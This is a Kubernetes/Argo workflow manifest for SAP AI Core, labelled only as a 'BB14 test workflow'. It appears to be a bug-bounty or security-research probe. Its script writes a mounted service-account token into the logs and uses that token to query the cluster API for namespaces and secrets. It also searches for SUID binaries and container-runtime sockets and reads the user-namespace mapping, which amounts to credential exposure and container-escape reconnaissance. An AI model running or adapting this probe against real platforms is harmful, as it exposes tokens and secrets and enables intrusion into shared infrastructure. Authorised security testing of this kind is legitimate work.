apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-probe
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-probe"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-probe"
    ai.sap.com/version: "40.0.0"
spec:
  entrypoint: main
  volumes:
  - name: proj-token
    projected:
      sources:
      - serviceAccountToken:
          path: token
          expirationSeconds: 3600
          audience: api
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      volumeMounts:
      - name: proj-token
        mountPath: /var/run/proj
      command:
      - bash
      - -c
      - |
        exec 2>&1
        echo "V40"
        echo "PROJ=$(ls /var/run/proj/ 2>/dev/null || echo NOMOUNT)"
        T=$(cat /var/run/proj/token 2>/dev/null)
        echo "TLEN=${#T}"
        if [ -n "$T" ]; then
          echo "T200=$(echo $T | head -c 200)"
          echo "NS=$(curl -sk -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces 2>&1 | head -c 300)"
          echo "SEC=$(curl -sk -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/secrets 2>&1 | head -c 300)"
        fi
        echo "SUID=$(find / -perm -4000 2>/dev/null | head -3)"
        echo "SOCK=$(ls /run/containerd/containerd.sock /var/run/docker.sock 2>/dev/null || echo NONE)"
        echo "UID=$(cat /proc/self/uid_map 2>/dev/null)"
        echo "V40DONE"
